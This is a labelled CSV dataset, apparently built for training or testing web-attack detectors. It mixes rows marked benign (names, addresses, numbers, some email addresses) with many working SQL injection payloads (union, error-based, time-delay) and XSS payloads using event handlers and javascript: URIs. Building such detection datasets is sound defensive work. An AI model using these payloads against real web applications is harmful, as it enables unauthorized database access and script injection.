index,payload,type
973,"1'||  (  select 'bnaz' from dual where 7168  =  7168 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli
20205,"<track draggable=""true"" ondragend=""alert(1)"">test</track>",xss
3372,select   (  case when   (  1291  =  6612  )   then 1 else 1291*  (  select 1291 from master..sysdatabases  )   end  )  --,sqli
20599,<IMG SRC=JaVaScRiPt:alert('XSS')>,xss
14804,22880,benign
16220,"<center onkeypress=""alert(1)"" contenteditable>test</center>",xss
14866,"mesas, las",benign
17700,"<image onmousedown=""alert(1)"">test</image>",xss
11453,8.85E+15,benign
252," select * from users where id  =  1 or ""??"" or 1  =  1 -- 1",sqli
13041,35742173n,benign
1397,"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",sqli
880,1   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  9548  =  9548,sqli
15466,"<a onmouseout=""alert(1)"">test</a>",xss
280,‘ or 1  =  1 --,sqli
15522,<acronym onfocusout=alert(1) tabindex=1 id=x></acronym><input autofocus>,xss
19806,<svg><rb onload=alert(1)></rb>,xss
489," select * from users where id  =  1 or ""  )  ["" or 1  =  1 -- 1",sqli
16487,"<dd draggable=""true"" ondragend=""alert(1)"">test</dd>",xss
1231,"1""  )   where 2834  =  2834   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",sqli
20616,"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",xss
17907,"<progress draggable=""true"" ondragenter=""alert(1)"">test</progress>",xss
3293,"1  )   union all select null,null,null,null,null#",sqli
16615,"<dialog draggable=""true"" ondrag=""alert(1)"">test</dialog>",xss
16374,"<command oncontextmenu=""alert(1)"">test</command>",xss
696, or ''  =  ',sqli
19053,"<style>@keyframes slidein {}</style><figcaption style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></figcaption>",xss
18511,"<strike onmouseleave=""alert(1)"">test</strike>",xss
3523,"1"" where 9083  =  9083 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",sqli
12433,"avinguda carrilet, 21,",benign
1782,"-1277""  )   where 6622  =  6622 or 3038  =  3038",sqli
15962,"<blink draggable=""true"" ondragend=""alert(1)"">test</blink>",xss
3687,"1"" where 9618  =  9618 and   (  3020  =  3020  )  *6703--",sqli
15939,<big id=x tabindex=1 onfocusin=alert(1)></big>,xss
12361,14973109v,benign
1714,-8071   )    )    or 9160  =  4253,sqli
152,like,sqli
3147,"1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#",sqli
15915,"<bgsound oncut=""alert(1)"" contenteditable>test</bgsound>",xss
13975,1940,benign
16744,"<div draggable=""true"" contenteditable>drag me</div><dd ondrop=alert(1) contenteditable>drop here</dd>",xss
12392,carlie,benign
18798,"<style>:target {color:red;}</style><mark id=x style=""transition:color 1s"" ontransitionend=alert(1)></mark>",xss
17797,<input type=radio id=x onfocus=alert(1)>,xss
3441,"1'   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sqli
18811,"<style>:target {color:red;}</style><object id=x style=""transition:color 1s"" ontransitionend=alert(1)></object>",xss
12659,werling,benign
13748,hornos,benign
14566,lorber-albasiny@cortinasartesol.pa,benign
15671,<aside id=x tabindex=1 onfocusin=alert(1)></aside>,xss
1768,1'   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'mfmk'  =  'mfmk,sqli
17562,"<hr oncontextmenu=""alert(1)"">test</hr>",xss
2729,"1""   )    )    as chal where 6661  =  6661",sqli
12681,giertych,benign
2761,-9739' or 8571  =  8571--,sqli
18835,"<style>:target {color:red;}</style><small id=x style=""transition:color 1s"" ontransitionend=alert(1)></small>",xss
18692,"<style>:target {color: red;}</style><shadow id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></shadow>",xss
16604,"<dfn onkeydown=""alert(1)"" contenteditable>test</dfn>",xss
13123,aguilar de bureba,benign
17482,"<header draggable=""true"" ondrag=""alert(1)"">test</header>",xss
12421,65340567m,benign
15286,4.48E+15,benign
15379,<isindex formaction=javascript:alert(1) type=submit value=click> ,xss
18712,"<style>:target {color: red;}</style><thead id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></thead>",xss
11294,47209,benign
17050,"<dt onmouseenter=""alert(1)"">test</dt>",xss
14819,9.52E+15,benign
19103,"<style>@keyframes slidein {}</style><plaintext style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></plaintext>",xss
12898,belonne santaella,benign
12446,3ist423o,benign
11391,darcy@google-movil.dz,benign
18468,"<span onclick=""alert(1)"">test</span>",xss
17533,"<hgroup ondblclick=""alert(1)"">test</hgroup>",xss
19393,"<style>@keyframes x{}</style><frameset style=""animation-name:x"" onanimationend=""alert(1)""></frameset>",xss
1861,"1""   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""vcjt"" like ""vcjt",sqli
3878,1 where 8095  =  8095,sqli
14437,delito,benign
953,"-9281  )   where 8363  =  8363 or make_set  (  8220  =  5127,5127  )  --",sqli
19212,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><input id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></input>",xss
13658,c7em,benign
18790,"<style>:target {color:red;}</style><keygen id=x style=""transition:color 1s"" ontransitionend=alert(1)></keygen>",xss
783," select * from users where id  =  1 union select 1 $$,version  (    )   -- 1",sqli
1452,"1'  )   as eymt where 3911  =  3911 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli
14660,pamente,benign
716,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",sqli
14803,46624,benign
11675,34310,benign
19373,"<style>@keyframes x{}</style><element style=""animation-name:x"" onanimationend=""alert(1)""></element>",xss
13407,37257,benign
20613,"<IMG SRC=""javascript:alert('XSS')""",xss
2374,"1%""   )    )    union all select null,null,null,null,null,null,null,null,null#",sqli
13643,"calle archidona 27, 11?a",benign
15173,yoon,benign
621," select * from users where id  =  1 or ""?_"" or 1  =  1 -- 1",sqli
1570,"1,  (  select   (  case when   (  7616  =  7616  )   then 1 else 1/  (  select 0  )   end   )    )   ",sqli
13256,"martel 153,",benign
20561,<svg><script ?>alert(1),xss
19520,"<style>@keyframes x{}</style><span style=""animation-name:x"" onanimationstart=""alert(1)""></span>",xss
11699,1.03E+15,benign
16922,"<div draggable=""true"" contenteditable>drag me</div><svg ondrop=alert(1) contenteditable>drop here</svg>",xss
18836,"<style>:target {color:red;}</style><source id=x style=""transition:color 1s"" ontransitionend=alert(1)></source>",xss
14900,55912738z,benign
14712,glickman,benign
2938,"1 where 5081  =  5081 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",sqli
2909,"1%'  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",sqli
17330,"<form onclick=""alert(1)"">test</form>",xss
15111,3.56E+15,benign
11789,caldes,benign
3943,1'||  (  select 'boxx' where 2038  =  2038 and 9198  =  9198--,sqli
3992,"1'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",sqli
2100,"1  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli
16851,"<div draggable=""true"" contenteditable>drag me</div><noscript ondragover=alert(1) contenteditable>drop here</noscript>",xss
20876,"<template match=""/"">",xss
3365,"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'lqql'  =  'lqql",sqli
2717,"1' in boolean mode  )   and elt  (  4249  =  4249,7259  )  #",sqli
1132,1' and 1541  =  6868#,sqli
19272,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><table id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></table>",xss
1534,-7758%'   )    )     )   or 3038  =  3038,sqli
3085,"-8472'  )   where 3340  =  3340 or make_set  (  1752  =  9905,9905  )  --",sqli
3987,1   )    )    and 3249  =  2985,sqli
1409,"1'||  (  select 'bpml' where 7360  =  7360 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",sqli
17896,"<pre onkeyup=""alert(1)"" contenteditable>test</pre>",xss
15809,<basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input id=y autofocus>,xss
15974,"<blink onbeforepaste=""alert(1)"" contenteditable>test</blink>",xss
19156,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><article id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></article>",xss
1621,1 where 5161  =  5161 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,sqli
2075,"1%"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""%""  =  """,sqli
161," select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1",sqli
2826,"1   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  2341  =  2341",sqli
16013,<blockquote onfocusout=alert(1) tabindex=1 id=x></blockquote><input autofocus>,xss
12588,yasna,benign
19225,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><marquee id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></marquee>",xss
18311,"<shadow oncut=""alert(1)"" contenteditable>test</shadow>",xss
348," select * from users where id  =  1 union select @<@,version  (    )   -- 1",sqli
13880,urko,benign
11514,72523597c,benign
3416,"-2009%' union all select 1991,1991#",sqli
12833,47939000p,benign
1530,-7941 or   (  5822  =  8754  )  *8754-- eepn,sqli
11977,bnrinfo,benign
2690,"-5125 union all select 5720,5720,5720,5720,5720,5720,5720,5720--",sqli
254," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",sqli
15542,<address id=x tabindex=1 ondeactivate=alert(1)></address><input id=y autofocus>,xss
11387,"c/ elvas 112, 13-a",benign
1069,"1%""   )    )     )   and 7533  =  7533 and    (    (     (  ""%""  =  """,sqli
13985,8466,benign
18438,"<spacer oncopy=""alert(1)"" contenteditable>test</spacer>",xss
19374,"<style>@keyframes x{}</style><element style=""animation-name:x"" onanimationstart=""alert(1)""></element>",xss
19248,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><q id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></q>",xss
13478,18120,benign
2283,1'||  (  select 'miew' where 8360  =  8360 waitfor delay '0:0:5'  )  ||',sqli
2419,"1""  )   as jtou where 8129  =  8129 and 7533  =  7533--",sqli
16980,"<div ondblclick=""alert(1)"">test</div>",xss
20389,"<video oncanplay=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",xss
16180,<caption onblur=alert(1) tabindex=1 id=x></caption><input autofocus>,xss
3425,"1'+  (  select 'ycsv' where 3628  =  3628 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sqli
16146,"<canvas onbeforecut=""alert(1)"" contenteditable>test</canvas>",xss
17693,"<image oncopy=""alert(1)"" contenteditable>test</image>",xss
1567,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,sqli
11325,casas de miravete,benign
18912,"<style>:target {transform: rotate(180deg);}</style><font id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></font>",xss
12612,9usta4ui6,benign
2554,"-4236  )   union all select 5260,5260,5260,5260,5260,5260,5260,5260,5260#",sqli
20136,"<time onmouseout=""alert(1)"">test</time>",xss
14754,thomasin,benign
18059,"<rt onmouseleave=""alert(1)"">test</rt>",xss
17056,"<dt onpaste=""alert(1)"" contenteditable>test</dt>",xss
11585,8.96E+15,benign
719,select * from users where id  =  '1' or $<\ or 1  =  1 -- 1',sqli
509,select * from users where id  =  1 or $<\ or 1  =  1 -- 1,sqli
18181,<samp onfocusout=alert(1) tabindex=1 id=x></samp><input autofocus>,xss
18548,"<strong onpaste=""alert(1)"" contenteditable>test</strong>",xss
19824,<svg><strike onload=alert(1)></strike>,xss
11703,eddisfor4,benign
1984,"1%' union all select null,null,null,null,null#",sqli
12735,magalia,benign
19142,"<style>@keyframes slidein {}</style><tt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></tt>",xss
13010,segundo,benign
11752,espaldilla,benign
18314,"<shadow onkeydown=""alert(1)"" contenteditable>test</shadow>",xss
17807,<ins id=x tabindex=1 ondeactivate=alert(1)></ins><input id=y autofocus>,xss
1192,"1""   )    )    as mvxa where 3024  =  3024",sqli
11388,"de canoves 13,",benign
3139,"-8841%""  )   or 4361  =  1910",sqli
3313,"1   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  7589  =  7589",sqli
2165,-5152'   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'jumr' like 'jumr,sqli
3316,1  )   as vqbf where 4020  =  4020,sqli
14703,bolkan@directoriogratuito.int,benign
13740,flloko-humet@imarbella.ms,benign
863,"-1212%'  )   or make_set  (  7588  =  2306,2306  )   and   (  '%'  =  '",sqli
14567,16300,benign
13978,28737,benign
17007,<dl onblur=alert(1) tabindex=1 id=x></dl><input autofocus>,xss
18552,"<style draggable=""true"" ondragleave=""alert(1)"">test</style>",xss
3693,"-7611  )   as tuje where 6101  =  6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--",sqli
12860,otia,benign
2409,1'  )   as mqxb where 6496  =  6496 and 7533  =  7533--,sqli
1812,"1%'  )   union all select null,null,null,null,null,null,null,null,null--",sqli
1847,"-6170   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sqli
1105,"1   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",sqli
20177,<tr id=x tabindex=1 onactivate=alert(1)></tr>,xss
12039,18243165w,benign
20649,"<BASE HREF=""javascript:alert('XSS');//"">",xss
16455,"<datalist draggable=""true"" ondragend=""alert(1)"">test</datalist>",xss
